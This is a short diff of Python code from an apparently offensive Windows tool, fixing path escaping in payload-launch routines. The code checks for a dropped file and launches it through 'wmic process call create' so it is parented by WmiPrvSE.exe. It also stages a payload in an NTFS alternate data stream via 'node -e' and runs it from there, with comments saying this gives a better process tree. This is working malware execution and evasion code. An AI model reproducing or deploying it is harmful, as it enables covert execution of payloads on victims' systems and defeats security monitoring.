@@ -947,7 +947,7 @@ return true;}}}}
         fchk=self.execute(f'if exist "{out}" (echo Y) else (echo N)')
         if not fchk or 'Y' not in fchk:return 'fail'
         # WMI execute — parent process = WmiPrvSE.exe
-        out_bs=out.replace('/','\\\\')
+        out_bs=out.replace('/','\\')
         wmi_cmd=f'wmic process call create "{out_bs} {args}"'
         o=self.execute(wmi_cmd)
         time.sleep(2)
@@ -980,7 +980,7 @@ return true;}}}}
         self.execute(f'node -e "{node_base}"')
         import time;time.sleep(1)
         # Try to execute from ADS via wmic (better process tree)
-        ads_bs=ads_full.replace('/','\\\\')
+        ads_bs=ads_full.replace('/','\\')
         self.execute(f'wmic process call create "{ads_bs} {args}"')
         time.sleep(2)
         tl=self.execute(f'tasklist 2>nul | findstr "svc"')
